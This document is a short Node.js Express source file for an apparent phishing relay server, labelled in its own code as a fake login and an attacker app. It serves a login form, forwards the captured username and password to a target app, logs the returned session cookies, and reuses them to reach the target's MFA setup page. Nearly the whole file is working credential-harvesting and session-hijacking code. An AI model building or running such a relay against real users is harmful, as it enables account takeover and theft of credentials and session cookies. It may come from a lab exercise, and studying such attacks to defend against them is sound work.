const express = require('express');
const axios = require('axios');

const app = express();

app.use(express.urlencoded({ extended: true }));

app.get('/', (req, res) => {

  res.send(`
    <h1>Fake Login</h1>

    <form method="POST" action="/login">

      <input
        name="username"
        placeholder="username"
      />

      <input
        type="password"
        name="password"
        placeholder="password"
      />

      <button type="submit">
        Login
      </button>

    </form>
  `);
});

app.post('/login', async (req, res) => {

  const {
    username,
    password,
  } = req.body;

  try {

    const response =
      await axios.post(
        'http://app:3000/login',
        new URLSearchParams({
          username,
          password,
        }),
        {
          headers: {
            'Content-Type':
              'application/x-www-form-urlencoded',
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );
    
    console.log(response.status);
    
    console.log(response.headers);
    
    const cookies =
      response.headers['set-cookie'];
    
    console.log(cookies);

    const meResponse =
      await axios.get(
        'http://app:3000/mfa/setup',
        {
          headers: {
            Cookie: cookies.join(';'),
          },
          maxRedirects: 0,
          validateStatus: () => true,
        }
      );

    console.log(meResponse.status);
    
    res.send(`
      <h1>Relay Result</h1>
    
      <pre>
    ${response.status}
      </pre>
    `);

  } catch (err) {

    console.error(err);

    res.send('Relay failed');
  }
});

app.listen(4000, () => {

  console.log(
    'Attacker app started on port 4000'
  );
});
